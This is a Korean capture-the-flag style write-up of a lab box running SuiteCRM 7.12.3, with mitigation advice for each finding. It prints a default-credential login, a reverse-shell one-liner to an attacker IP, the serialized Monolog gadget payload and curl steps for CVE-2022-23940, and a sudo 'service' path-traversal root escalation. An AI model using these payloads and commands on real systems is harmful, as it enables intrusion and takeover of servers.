---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/deserialization
  - tech/web/default-creds
  - tech/lin/sudo-abuse
  - tech/enum/dirbust
  - tech/enum/searchsploit
  - tech/payload/revshell
type: machine
platform: pg
os: linux
ip: 192.168.248.146
ports: [22, 80, 3306, 33060]
services: [http, mysql, mysqlx, ssh]
cves: [CVE-2022-23940]
status: solved
manual_tags: true
manual_cves: true
tech_count: 6
---

> [!info] 요약
> 타겟 `192.168.248.146` · Debian 10(buster, 커널 4.19.0-24) · Intermediate · 플래그 2개
> 진입점: SuiteCRM 7.12.3 기본 자격증명 `admin:admin` → CVE-2022-23940 인증 후 PHP 객체 역직렬화 RCE → `www-data`
> 권한상승: `sudo -l` 의 `(ALL) NOPASSWD: /usr/sbin/service` → 인자 경로 이어붙이기로 `/bin/bash` 실행 → `root`
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.248.146

### Initial Access – SuiteCRM 기본 자격증명 로그인 후 AOR_Scheduled_Reports 타입 검사 우회로 PHP 객체 역직렬화 RCE

**Vulnerability Explanation:** SuiteCRM 7.12.3 의 `AOR_Scheduled_Reports` 모듈에 인증 후 PHP 객체 역직렬화(PHP Object Injection) 존재 — CVE-2022-23940.
- `save()` 가 `is_array($_POST['email_recipients'])` 일 때만 값을 `base64_encode(serialize(...))` 로 정규화함. 스칼라 문자열로 보내면 **그 분기 자체를 건너뛰어** 공격자 입력이 DB 컬럼에 원문 그대로 저장됨
- 조회 경로 `get_email_recipients()` 가 그 컬럼을 `unserialize(base64_decode(...))` 함 = 진짜 sink. 저장과 발화가 다른 함수에서 일어나는 2차(저장형) 역직렬화
- 가젯은 앱 코드가 아니라 번들된 `vendor/monolog` 에서 나옴 — phpggc `Monolog/RCE2` 체인이 `__destruct` → `call_user_func('system', …)` 로 굴러감
- 관리자 전용이 아님. PoC README 원문 — *"any user with permission to create Scheduled Reports can obtain remote code execution"*
- 기본 자격증명 `admin:admin` 이 그 인증 전제조건을 채워 줌

**Vulnerability Fix:**
- SuiteCRM 7.12.5 이상으로 업그레이드(SuiteCRM-Core 는 8.0.4). 벤더가 이 결함을 이미 패치함
- `save()` 의 `else` 분기에서 예상 타입이 아닌 입력을 거부할 것. 검사에 안 걸린 입력을 「안전」으로 취급하지 말 것
- 사용자 데이터에 `unserialize()` 를 쓰지 말 것 — `json_decode()` 처럼 객체를 되살리지 않는 포맷으로 교체. 불가피하면 `unserialize($d, ['allowed_classes' => false])` + HMAC 서명
- 설치 시 관리자 기본 자격증명 강제 변경. 단 이것만으로는 부족함 — 예약 보고서 생성 권한이 있는 저권한 계정 하나만 새도 경로가 살아 있음
- `PHPSESSID` 에 `session.cookie_httponly=1`·`session.cookie_secure=1`·`SameSite=Lax` 적용. nmap NSE 가 `httponly flag not set` 을 잡아냈음 — XSS 가 곧 세션 탈취가 되는 상태
- 설치 완료 후 인스톨러 산출물(`install.log`·`install/`)을 삭제하거나 웹루트 밖으로 옮기고, 웹서버에서 `.log` 확장자를 거부할 것. 설치 로그에는 경로·버전·구성요소가 남고 제품에 따라 자격증명이 섞이기도 함
- 심층 방어 — 아웃바운드 egress 필터링. 서버가 임의 포트로 나가지 못하면 RCE 가 나도 리버스셸이 안 붙음

**Severity:** High — 인증 후 원격 코드 실행. 인증 전제조건이 기본 자격증명으로 충족돼 실질 난이도는 무인증에 가까움

**Steps to reproduce the attack:**
1. `curl -i -X POST /index.php` 로 `admin:admin` 로그인 확인 — 302 + `Location: index.php?module=Home` 이면 성공
2. tmux 로 `rlwrap nc -lvnp 4444` 리스너 기동
3. 리버스셸 한 줄을 `base64 -w0` 로 인코딩
4. `exploit.py -h http://192.168.248.146 -u admin -p admin -P '<echo b64 | base64 -d | bash>'` 실행
5. 스크립트 출력이 아니라 리스너를 확인 — `www-data` 셸 수신
6. `python3 -c "import pty;pty.spawn('/bin/bash')"` 로 TTY 확보

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.248.146 | TCP: 22, 80, 3306, 33060 |

스캔은 두 번 돌았고 산출물도 둘임. 하나는 `-sCV -p- -Pn -A --min-rate 5000`(플래그 조합이 `nnmap` 별칭과 동일. 단 기록된 명령줄의 `-oN` 은 절대경로라 별칭 그대로는 아님), 다른 하나는 `-sS -sV -p- --min-rate 2000 -T4` 임.

```text
# Nmap 7.98 scan initiated Wed Aug 19 16:49:26 2026 as: /usr/lib/nmap/nmap -sCV -p- -Pn -A --min-rate 5000 -oN /home/kali/PG/Crane/nmap.log 192.168.248.146
Nmap scan report for 192.168.248.146
Host is up (0.094s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 37:80:01:4a:43:86:30:c9:79:e7:fb:7f:3b:a4:1e:dd (RSA)
|   256 b6:18:a1:e1:98:fb:6c:c6:87:55:45:10:c6:d4:45:b9 (ECDSA)
|_  256 ab:8f:2d:e8:a2:04:e7:b7:65:d3:fe:5e:93:1e:03:67 (ED25519)
80/tcp    open  http    Apache httpd 2.4.38 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.38 (Debian)
| http-title: SuiteCRM
|_Requested resource was index.php?action=Login&module=Users
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
3306/tcp  open  mysql   MySQL (unauthorized)
33060/tcp open  mysqlx  MySQL X protocol listener
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 554/tcp)
HOP RTT      ADDRESS
1   93.59 ms 192.168.45.1
2   93.56 ms 192.168.45.254
3   93.70 ms 192.168.251.1
4   93.81 ms 192.168.248.146

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Aug 19 16:49:57 2026 -- 1 IP address (1 host up) scanned in 30.90 seconds
```
— 출처: `~/PG/Crane/nmap.log`

```text
# Nmap 7.98 scan initiated Wed Aug 19 16:49:55 2026 as: /usr/lib/nmap/nmap -sS -sV -p- --min-rate 2000 -T4 -oN nmap_full.txt 192.168.248.146
Nmap scan report for 192.168.248.146
Host is up (0.11s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp    open  tcpwrapped
3306/tcp  open  mysql      MySQL (unauthorized)
33060/tcp open  mysqlx     MySQL X protocol listener
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Aug 19 16:50:54 2026 -- 1 IP address (1 host up) scanned in 59.32 seconds
```
— 출처: `~/PG/Crane/nmap_full.txt`

포트 집합은 두 스캔이 일치함(22·80·3306·33060). **80 의 서비스 판정만 갈림** — 앞 스캔은 `Apache httpd 2.4.38 ((Debian))`, 뒤 스캔은 `tcpwrapped`.

- `tcpwrapped` = TCP 핸드셰이크는 성립했으나 버전 프로브 도중 연결이 끊긴 것. 「서비스 없음」이 아님
- 두 스캔이 겹쳐 돌았음(앞 스캔 종료 16:49:57, 뒤 스캔 시작 16:49:55) — 동시 프로빙에 웹서버가 연결을 끊었을 가능성 `[가정]`. 실제 원인은 확인하지 않음
- 실무 판정은 **NSE 가 붙은 쪽**이 이김. `http-title: SuiteCRM` 한 줄이 이 박스의 시작점이었고 `tcpwrapped` 만 봤으면 80 을 건너뛸 뻔했음

`Not shown: 65531 closed tcp ports (reset)` 는 RST 응답임. 확정되는 것은 ① 묵살형 인라인 차단이 없음 ② 숨은 고번호 포트가 없음 둘뿐. **「방화벽이 없다」의 증거는 아님** — `iptables -j REJECT --reject-with tcp-reset`·방화벽 장비의 reject 정책·클라우드 보안그룹 전부 RST 를 돌려줌.

`3306/tcp MySQL (unauthorized)` — 포트는 열렸으나 내 IP 가 `mysql.user` 호스트 목록과 매칭되지 않음. 나중에 `config.php` 에서 `root`/빈 패스워드를 얻어도 외부에서는 못 씀.

공격면은 사실상 **80 하나**임. 3306 은 위 이유로 튕기고, SMB·NFS·RPC 는 전수 스캔에서 전부 closed 였음(두 스캔 모두 열린 포트가 22·80·3306·33060 넷뿐).

**버전 확정 — 독립 근거 2개**

① 비인증 REST 엔드포인트 `get_server_info`:

```bash
curl -s "http://192.168.248.146/service/v4_1/rest.php?method=get_server_info&input_type=JSON&response_type=JSON&rest_data=%7B%7D"
```

```text
{"flavor":"CE","version":"6.5.25","suitecrm_version":"7.12.3","gmt_time":"2026-08-19 07:53:08"}
```
— 출처: 원본 노트 보존 출력. 파일로는 미보존이나 응답 안의 `gmt_time` 07:53:08 UTC = 16:53:08 KST 가 산출물 mtime(16:52:49) 직후라 실행 시각과 정합함

② root 획득 뒤 타겟 파일에서 재확인 — `Post-Exploitation` 절의 `suitecrm_version.php` 조회.

같은 응답의 **`version: 6.5.25` 에 낚이면 안 됨.** SuiteCRM 이 포크한 SugarCRM CE 의 기반 버전이지 제품 버전이 아님. CVE 매칭은 `suitecrm_version` 쪽으로 함.

`[가정 — 산출물 미보존]` 원본 노트는 `/README.md` 선두 헤딩 `# SuiteCRM 7.12.3` 도 교차 근거로 적었으나 그 응답은 파일로 남아 있지 않음.

robots.txt:

```text
User-agent: *
Disallow: /

User-agent: Googlebot
Allow: /ical_server.php
```

**디렉터리 열거 — feroxbuster**

```bash
feroxbuster -u http://192.168.248.146/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak,zip -t 100 -o ferox.log
```

결과 1085행. 대부분 `themes/`·`cache/`·`vendor/` 정적 자산 노이즈이고 유의미한 것은 20행 미만임.

```text
401      GET        1l        6w       52c http://192.168.248.146/ical_server.php
301      GET        0l        0w        0c http://192.168.248.146/ => index.php?action=Login&module=Users
200      GET        1l        5w       23c http://192.168.248.146/pdf.php
200      GET        1l        5w       23c http://192.168.248.146/export.php
500      GET        1l        4w       21c http://192.168.248.146/cron.php
200      GET        1l        3w       47c http://192.168.248.146/maintenance.php
301      GET        9l       28w      320c http://192.168.248.146/modules => http://192.168.248.146/modules/
301      GET        9l       28w      320c http://192.168.248.146/service => http://192.168.248.146/service/
301      GET        9l       28w      319c http://192.168.248.146/custom => http://192.168.248.146/custom/
301      GET        9l       28w      319c http://192.168.248.146/vendor => http://192.168.248.146/vendor/
200      GET      508l     4438w    29019c http://192.168.248.146/service/v2/rest.php
200      GET      700l     5581w    37232c http://192.168.248.146/service/v4/rest.php
200      GET      756l     6050w    40581c http://192.168.248.146/service/v4_1/rest.php
200      GET      109l     1203w    38250c http://192.168.248.146/service/v2/soap.php
200      GET      113l     1371w    45304c http://192.168.248.146/service/v4_1/soap.php
500      GET        0l        0w        0c http://192.168.248.146/service/v4_1/registry.php
200      GET      342l     1205w    15169c http://192.168.248.146/service/example/example.html
200      GET      328l     1111w    14219c http://192.168.248.146/service/example/test.html
```
— 출처: `~/PG/Crane/ferox.log`

이 목록은 상태코드만 보면 오독함.

- `200 … 23c` 인 `pdf.php`·`export.php` 는 본문이 `"Not A Valid Entry Point"` — 200 인데 거부 응답임. 크기를 안 보면 「노출된 엔드포인트」로 착각함
- `500` 은 서버 오류지 「막혔다」가 아님. `cron.php` 는 CLI 전용이라 웹에서 부팅에 실패한 것뿐
- `301 /vendor` 가 뜬 것이 역직렬화 관점에서 중요함 — 가젯 공급원인 Composer 의존성이 웹루트 아래에 있다는 뜻

**노출 파일 조사**

| 경로 | 상태 | 내용 | 근거 |
|---|---|---|---|
| `/install.log` | 200, 51295B | 설치일 2023-08-24, DB 드라이버·XML 파서·ZIP 지원 부재 ERROR 와 설치 진행 로그. 자격증명 값 없음 | ✅ 실측 — `~/PG/Crane/install.log` |
| `/install.php` | 200 | `installer_locked => true` — 재설치 불가 | `[가정 — 산출물 미보존]` |
| `/config.php`, `/config_override.php` | 200, 0바이트 | PHP 가 정상 파싱함, 유출 없음 | `[가정 — 산출물 미보존]` |

`install.log` 에 `password` 문자열은 44행 등장하나 전부 아래 한 문구의 반복이고 **값은 없음.**

```text
2023-08-24 11:40:35...ERROR::  The provided database host, username, and/or password is invalid, and a connection to the database could not be established. Please enter a valid host, username and password
```
— 출처: `~/PG/Crane/install.log` 151행

51KB 설치 로그가 그대로 서빙되는 정보 노출이지만 피벗 대상은 아니었음.

`/config.php` 가 0바이트로 온 것은 PHP 핸들러가 정상 동작한다는 뜻임(출력이 없는 순수 배열 정의 파일). 여기서 **평문이 그대로 보였다면 PHP 핸들러가 죽은 것**이고 그게 곧 DB 자격증명 유출임. `.bak`/`~`/`.old` 확장자는 PHP 로 파싱되지 않아 평문으로 떨어지므로 feroxbuster 의 `-x` 에 `bak` 을 넣었음.

**searchsploit**

```bash
searchsploit suitecrm
```

```text
SuiteCRM 7.10.7  - 'parentTab' SQL Injection          | php/webapps/46310.txt
SuiteCRM 7.10.7  - 'record' SQL Injection             | php/webapps/46311.txt
SuiteCRM 7.11.15 - 'last_name' Remote Code Execution  | php/webapps/49001.py
SuiteCRM 7.11.18 - Remote Code Execution (RCE)        | php/webapps/50531.rb
```

전부 7.12.3 보다 낮은 버전 대상임. 타겟에 맞는 것은 exploit-db 가 아니라 CVE-2022-23940(7.12.5 에서 패치)이고 GitHub PoC 를 써야 함.

### Initial Access – SuiteCRM 역직렬화 RCE

**① 기본 자격증명 확인 — CVE 보다 먼저**

post-auth CVE 는 자격증명 확보가 선행 조건이라 순서가 뒤집힘. SuiteCRM 로그인 폼에는 `csrf_token` 이 없어 curl 한 방으로 검증됨.

```bash
curl -sS -i -X POST 'http://192.168.248.146/index.php' \
    -d 'module=Users&action=Authenticate&user_name=admin&username_password=admin&Login=Log+In'
```

```text
HTTP/1.1 302 Found
Date: Wed, 19 Aug 2026 07:52:17 GMT
Server: Apache/2.4.38 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: sugar_user_theme=SuiteP; expires=Thu, 19-Aug-2027 07:52:17 GMT; Max-Age=31536000; HttpOnly
Set-Cookie: PHPSESSID=sjo380h10tbfpm7ih1lav9vdms; path=/
Location: index.php?module=Home&action=index
Content-Length: 2216
Content-Type: text/html; charset=UTF-8
```
— 출처: `~/PG/Crane/resp.txt` (헤더까지. 뒤따르는 응답 본문 2216B 는 생략)

`302` + `Location: index.php?module=Home` = 인증 성공. **admin:admin** 성립. 쿠키 항아리도 같이 남았음(`~/PG/Crane/c.txt` — `PHPSESSID=sjo380h10tbfpm7ih1lav9vdms`), 즉 실제 호출에는 `-c` 가 함께 붙어 있었음.

판정이 curl 플래그 셋에 달려 있음.

| 플래그 | 역할 | 빼면 |
|---|---|---|
| `-i` | 응답 헤더 출력 | 성공/실패가 `Location:` 헤더로 갈려 **판정 자체가 불가능** |
| `-sS` | 진행률만 끄고 에러는 표시 | `-s` 만 쓰면 연결 실패도 조용히 지나감 |
| `-L` 미사용 | 리다이렉트를 따라가지 않음 | 붙이면 302 를 따라가 최종 200 만 보임 — 판정 신호 소멸 |

**② 리스너 기동**

```bash
tmux new-session -d -s crane 'rlwrap nc -lvnp 4444'
```

**③ 페이로드 인코딩**

```bash
echo -n 'bash -i >& /dev/tcp/192.168.45.207/4444 0>&1' | base64 -w0
```

```text
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIwNy80NDQ0IDA+JjE=
```

`echo -n` 은 후행 개행 제거, `base64 -w0` 은 줄바꿈 억제(기본값이 76자마다 줄바꿈이라 여러 줄이 된 base64 는 HTTP 파라미터에서 잘림). 둘 다 빼면 조용히 깨짐.

리버스셸 원문에 `&`·`>` 가 섞여 있어 익스플로잇 인자 → `system()` → `/bin/sh -c` 경로에서 파손되므로 base64 로 한 겹 감싼 것임. 최종 파이프는 반드시 **`| bash`** — `system()` 이 `/bin/sh -c` 를 쓰고 데비안의 `sh` 는 dash 라 `/dev/tcp` 를 못 씀.

**④ 익스플로잇 발사**

```bash
git clone https://github.com/manuelz120/CVE-2022-23940.git
cd CVE-2022-23940
python3 exploit.py -h http://192.168.248.146 -u admin -p admin \
    -P 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIwNy80NDQ0IDA+JjE= | base64 -d | bash'
```

```text
INFO:CVE-2022-23940:Login did work - Trying to create scheduled report
```

**여기서 스크립트가 굳고 결국 타임아웃됨 — 실패가 아님.**

`exploit.py` 는 저 INFO 를 찍은 «직후» `Save` POST 를 보내고, 응답이 오면 `Succesfully created scheduled report with id …` 를 찍는다. 그 줄이 안 나왔다는 것은 **Save POST 가 반환되지 않았다**는 뜻임. 역직렬화가 그 요청 처리 도중 인라인으로 발화해 리버스셸이 요청 스레드를 붙잡았기 때문임. 스크립트 마지막의 `action=run` 트리거까지 갈 필요조차 없었음.

— 근거: `~/PG/Crane/CVE-2022-23940/exploit.py` 의 로그 순서. 클론본은 `git status --porcelain` 이 비어 있어 무수정 상태이고, `git log` 에 `FIX: added auto trigger rev sh` 가 있어 자동 트리거가 포함된 판본임.

**⑤ 리스너 확인**

```bash
listening on [any] 4444 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.146] 36438
bash: cannot set terminal process group (610): Inappropriate ioctl for device
bash: no job control in this shell
www-data@crane:/var/www/html$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@crane:/var/www/html$ export TERM=xterm
www-data@crane:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@crane:/var/www/html$ uname -a
Linux crane 4.19.0-24-amd64 #1 SMP Debian 4.19.282-1 (2023-04-29) x86_64 GNU/Linux
```
— 출처: tmux 세션 `crane` 의 리스너 출력. 원본 노트에 보존됐으나 `~/PG/Crane/` 에 파일로는 미보존

`bash: cannot set terminal process group … no job control` 이 **TTY 부재의 증거**임. `pty.spawn` 으로 의사 터미널을 확보한 뒤에야 `sudo` 가 동작함.

**페이로드가 무엇이었는가**

실제로 날아간 직렬화 문자열은 `exploit.py` 의 `payload_template_start/second/third` 세 상수임. 최상위는 `BufferHandler` 가 아니라 `SyslogUdpHandler` 이고, 그 `socket` 프로퍼티에 `BufferHandler` 를 담는 phpggc `Monolog/RCE2` 형태임.

```python
payload_template_start = b'a:2:{i:7;O:32:"Monolog\\Handler\\SyslogUdpHandler":1:{s:6:"socket";O:29:"Monolog\\Handler\\BufferHandler":7:{s:10:"\x00*\x00handler";O:29:"Monolog\\Handler\\BufferHandler":7:{s:10:"\x00*\x00handler";N;s:13:"\x00*\x00bufferSize";i:-1;s:9:"\x00*\x00buffer";a:1:{i:0;a:2:{i:0;'
payload_template_second = b';s:5:"level";N;}}s:8:"\x00*\x00level";N;s:14:"\x00*\x00initialized";b:1;s:14:"\x00*\x00bufferLimit";i:-1;s:13:"\x00*\x00processors";a:2:{i:0;s:7:"current";i:1;s:6:"system";}}s:13:"\x00*\x00bufferSize";i:-1;s:9:"\x00*\x00buffer";a:1:{i:0;a:2:{i:0;'
payload_template_third = b';s:5:"level";N;}}s:8:"\x00*\x00level";N;s:14:"\x00*\x00initialized";b:1;s:14:"\x00*\x00bufferLimit";i:-1;s:13:"\x00*\x00processors";a:2:{i:0;s:7:"current";i:1;s:6:"system";}}}i:7;i:7;}'
```
— 출처: `~/PG/Crane/CVE-2022-23940/exploit.py`

세 상수 사이에 `command_payload = f's:{len(payload)}:"{payload}"'` 가 두 번 끼워지고 전체가 base64 로 감싸짐. 즉 명령 문자열은 안쪽·바깥쪽 두 `BufferHandler` 의 `buffer` 에 각각 한 번씩 들어감.

발화 흐름 — `SyslogUdpHandler::__destruct` 가 `socket` 자리의 객체에 대해 정리 메서드를 부르고, 그 자리에 든 `BufferHandler` 가 버퍼를 플러시하면서 `processors` 배열을 순회함. `['current', 'system']` 두 개인 이유는 타입 때문임 — 첫 반복의 `current()` 가 레코드 배열에서 명령 문자열을 꺼내고, 그 반환값이 다음 반복에서 `system('<명령>')` 의 인자가 됨. `bufferLimit`/`bufferSize` = `-1`, `initialized` = `true`, `level` = `null` 은 플러시가 조기 반환하지 않게 맞춘 값임.
`[가정]` 위 클래스 골격과 프로퍼티 값은 디스크의 `exploit.py` 로 확정했으나, 각 메서드 이름과 내부 분기는 이 박스에서 Monolog 소스를 직접 열어 확인하지는 않음.

**수동 대안** — 아래는 **미실행 절차임.** 이 박스는 `exploit.py` 로 풀었고 타겟은 정지됨. 출력은 기록하지 않음. 필드 구성은 추측이 아니라 `exploit.py` 소스와 PoC README 의 요청 원문에서 읽어낸 것임.

```bash
# ① 세션 확보 — PHPSESSID 저장
curl -sS -c cookies.txt -X POST 'http://TARGET/index.php' \
  -d 'module=Users&action=Authenticate&user_name=admin&username_password=admin'

# ② 페이로드 생성 (base64 출력)
phpggc Monolog/RCE2 system 'echo <b64> | base64 -d | bash' -b

# ③ 전송 — 필수 필드 전량 + Referer
curl -sS -b cookies.txt -X POST 'http://TARGET/index.php' \
  -H 'Referer: http://TARGET' \
  --data-urlencode 'module=AOR_Scheduled_Reports' \
  --data-urlencode 'action=Save' \
  --data-urlencode 'name=test' \
  --data-urlencode 'status=active' \
  --data-urlencode 'schedule_type=monthly' \
  --data-urlencode 'email_recipients=<② 출력>'

# ④ (필요시) 트리거 — 응답의 record_id='...' 를 뽑아 run
curl -sS -b cookies.txt \
  'http://TARGET/index.php?module=AOR_Scheduled_Reports&action=run&record=<record_id>'

# ⑤ 리스너 확인
```

`exploit.py` 가 실제로 보내는 필드가 그 6개이고 헤더는 `Referer: <host>` + `content-type: application/x-www-form-urlencoded` 임. PoC README 가 싣고 있는 요청 원문도 동일함:

```http
POST /index.php HTTP/1.1
Host: localhost
Referer: http://localhost
content-type: application/x-www-form-urlencoded
Cookie: PHPSESSID=e7alkhdo7lrknc8a7l6v2rpanr; sugar_user_theme=SuiteP

module=AOR_Scheduled_Reports&action=Save&name=test&status=active&schedule_type=monthly&email_recipients=YToyOntpOjc7...
```
— 출처: `~/PG/Crane/CVE-2022-23940/README.md` (헤더 일부 생략)

`[가정]` **`name`·`status`·`schedule_type`·`Referer` 가 «필수»인지는 미검증임.** 확정된 것은 「`exploit.py` 와 README 가 그 6필드 + 두 헤더를 보낸다」까지고, 하나씩 빼서 실패를 확인한 적은 없음(타겟 정지). 수동 재현 시에는 전부 넣고 시작할 것.

③ 에서 이미 셸이 붙음. Save 응답을 렌더하면서 서버가 방금 저장한 레코드를 다시 읽고, 그 조회 경로가 `get_email_recipients()` → `unserialize()` 이기 때문임.

**취약 코드 — 1차 사료**

PoC README 가 인용한 벤더 코드임. `save()` 는 디코드하지 «않고» 인코드함. 두 함수를 나란히 놓아야 버그가 보임.

```php
// SuiteCRM-Core/public/legacy/modules/AOR_Scheduled_Reports/AOR_Scheduled_Reports.php

public function save($check_notify = false)
{
    if (isset($_POST['email_recipients']) && is_array($_POST['email_recipients'])) {
        $this->email_recipients = base64_encode(serialize($_POST['email_recipients']));
    }

    return parent::save($check_notify);
}

public function get_email_recipients()
{
    $params = unserialize(base64_decode($this->email_recipients));
    // ....
```
— 출처: `~/PG/Crane/CVE-2022-23940/README.md`

| | `email_recipients[]=a&email_recipients[]=b` (배열) | `email_recipients=<공격자 문자열>` (스칼라) |
|---|---|---|
| `is_array()` | true | **false** |
| 실행되는 분기 | `base64_encode(serialize(...))` — 서버가 값을 재생성 | **분기 자체를 건너뜀** |
| DB 에 저장되는 것 | 서버가 만든 안전한 값 | 공격자 입력 원문 그대로 |

검사를 통과하는 것이 아니라 **검사가 붙은 분기로 진입하지 않는 것**임. PHP 는 `a[]=1`(배열)과 `a=1`(문자열)을 같은 HTTP 파라미터 문법으로 둘 다 표현할 수 있어 이 우회가 유독 쉬움.

**Local.txt value:**
`dd091466af4faca653da308c6d836aa1`

위치는 `/home` 이 아니라 `/var/www/local.txt` — 일반 사용자 계정이 아예 없는 박스임.

```bash
www-data@crane:/var/www/html$ ls -la /home/
total 8
drwxr-xr-x  2 root root 4096 Jun  6  2023 .
drwxr-xr-x 18 root root 4096 Jun 13  2023 ..

www-data@crane:/var/www/html$ find / -name local.txt 2>/dev/null
/var/www/local.txt

www-data@crane:/var/www/html$ cat /var/www/local.txt
dd091466af4faca653da308c6d836aa1
```

`2>/dev/null` 은 비특권 셸이 `/proc`·`/root` 를 훑으며 뱉는 `Permission denied` 수천 줄을 버림. 이걸 빼면 에러가 화면을 덮어 결과 한 줄을 놓침.

### Privilege Escalation – sudo `service` 인자 경로 이어붙이기 (GTFOBins)

**Vulnerability Explanation:** sudoers 가 `www-data` 에 `(ALL) NOPASSWD: /usr/sbin/service` 를 인자 제한 없이 부여함.
- `/usr/sbin/service` 는 컴파일된 바이너리가 아니라 셸 스크립트임(`init-system-helpers` 패키지)
- 인자로 받은 서비스명을 `"$SERVICEDIR/$SERVICE"` 로 **문자열 연결한 뒤 그대로 `exec`** 함. `SERVICEDIR="/etc/init.d"`
- 인용은 돼 있어 공백·세미콜론 주입은 안 되지만 **경로 구분자 `/` 를 거르지 않음** → 상대경로로 `/etc/init.d/` 밖 탈출 가능
- 웹 서비스 계정이 임의 실행 파일을 root 로 띄울 수 있게 됨

**Vulnerability Fix:**
- 웹 서비스 계정(`www-data`)에 sudo 를 주지 말 것
- 불가피하면 인자를 받지 않는 전용 래퍼(`/usr/local/sbin/restart-app`)를 지정할 것. `service` 같은 범용 실행기는 인자 제한이 원천적으로 불가능함
- `NOPASSWD` 를 빼는 것만으로는 부족함 — 다만 `www-data` 는 비밀번호를 모르는 계정이라 이 박스에서는 그것만으로도 경로가 닫혔음

**Severity:** High — 로컬 권한상승으로 완전 장악(`www-data` → `root`)

**Steps to reproduce the attack:**
1. TTY 확보 후 `sudo -l` 실행
2. `(ALL) NOPASSWD: /usr/sbin/service` 확인 — 인자 제한 없음
3. GTFOBins `service` 항목 조회 → 인자가 `/etc/init.d/` 에 이어붙는 구조 확인
4. `sudo /usr/sbin/service ../../../../../bin/bash` 실행 → root 셸
5. `cat /root/proof.txt`

**열거**

```bash
www-data@crane:/var/www/html$ sudo -l
Matching Defaults entries for www-data on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/sbin/service
```

| 줄 | 의미 |
|---|---|
| `(ALL) NOPASSWD: /usr/sbin/service` | 모든 사용자로(root 포함) 비밀번호 없이 실행 가능. `www-data` 의 비밀번호를 모르므로 `NOPASSWD` 가 아니었으면 여기서 끝났음 |
| `env_reset` | 환경변수 초기화 → `LD_PRELOAD`·`LD_LIBRARY_PATH` 봉쇄 |
| `secure_path=...` | `PATH` 고정 → PATH 하이재킹 봉쇄 |
| 인자 제한 없음 | `/usr/sbin/service ""` 같은 제약이 없음. **인자를 자유롭게 줄 수 있다는 것이 이 취약점의 전부** |

**왜 통하는가 — `service` 원문**

Kali 의 `/usr/sbin/service` 에서 그대로 뽑은 것임(`dpkg -S` → `init-system-helpers`).

```sh
SERVICEDIR="/etc/init.d"

run_via_sysvinit() {
   # Otherwise, use the traditional sysvinit
   if [ -x "${SERVICEDIR}/${SERVICE}" ]; then
      exec env -i LANG="$LANG" LANGUAGE="$LANGUAGE" LC_CTYPE="$LC_CTYPE" LC_NUMERIC="$LC_NUMERIC" LC_TIME="$LC_TIME" LC_COLLATE="$LC_COLLATE" LC_MONETARY="$LC_MONETARY" LC_MESSAGES="$LC_MESSAGES" LC_PAPER="$LC_PAPER" LC_NAME="$LC_NAME" LC_ADDRESS="$LC_ADDRESS" LC_TELEPHONE="$LC_TELEPHONE" LC_MEASUREMENT="$LC_MEASUREMENT" LC_IDENTIFICATION="$LC_IDENTIFICATION" LC_ALL="$LC_ALL" PATH="$PATH" TERM="$TERM" "$SERVICEDIR/$SERVICE" ${ACTION} ${OPTIONS}
   else
      echo "${SERVICE}: unrecognized service" >&2
      exit 1
   fi
}
```
— 출처: Kali `/usr/sbin/service` (`init-system-helpers` 패키지)

- `if [ -x … ]` 가드 — 실행 비트가 있는 파일만 통과함. 통과 못 하면 `unrecognized service` 가 뜸
- `exec env -i …` — 환경을 로케일·`PATH`·`TERM` 만 남기고 비움. `sudo` 의 `env_reset` 위에 한 겹 더라 환경변수 계열은 두 겹으로 막힘
- 남는 공격면은 **「인자가 경로에 이어붙는다」 하나뿐**이고 그것이 GTFOBins 에 오른 이유임

| 입력 | 이어붙인 결과 | 실행되는 것 |
|---|---|---|
| `apache2` | `/etc/init.d/apache2` | 정상 동작 |
| `../../bin/bash` | `/etc/init.d/../../bin/bash` | **`/bin/bash`** |
| `../../../../../bin/bash` | `/etc/init.d/../../../../../bin/bash` | **`/bin/bash`** (동일) |

`..` 를 넉넉히 넣어도 되는 이유는 커널 경로 해석에서 `/..` 가 `/` 이기 때문임. 루트보다 위가 없어 초과분이 흡수됨 — **정확한 깊이를 셀 필요가 없음.**

**실행**

```bash
www-data@crane:/var/www/html$ sudo /usr/sbin/service ../../../../../bin/bash
root@crane:/# id
uid=0(root) gid=0(root) groups=0(root)
root@crane:/# cat /root/proof.txt
f92c362a87099978dbf8f3f108147934
```

### Post-Exploitation

**Proof.txt value:**
`f92c362a87099978dbf8f3f108147934`

| | 위치 | 값 |
|---|---|---|
